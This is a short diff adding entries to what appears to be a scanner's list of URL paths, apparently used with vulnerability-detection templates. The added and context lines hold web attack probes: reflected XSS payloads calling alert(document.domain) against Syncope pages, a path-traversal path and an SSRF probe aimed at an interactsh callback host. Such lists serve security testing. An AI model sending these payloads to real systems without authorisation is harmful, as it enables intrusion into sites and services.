@@ -271,3 +271,10 @@
 /index.php?option=com_virtuemart&view=../../../configuration&tmpl=component
 /api/public/info/
 /api/auth/remotefacilityuser?baseurl=http://{{interactsh-url}}&username={{randstr}}&facility={{randstr}}
+/m/
+/api/instance-info
+/syncope-console/login?notificationMessage={{str}}%27%2Balert%28document.domain%29%2B%27
+/syncope-enduser/?notificationMessage={{str}}%27%2Balert%28document.domain%29%2B%27
+/?file=__new__{{randstr}}%27-alert(document.domain)-%27
+/info
+/web/info.html
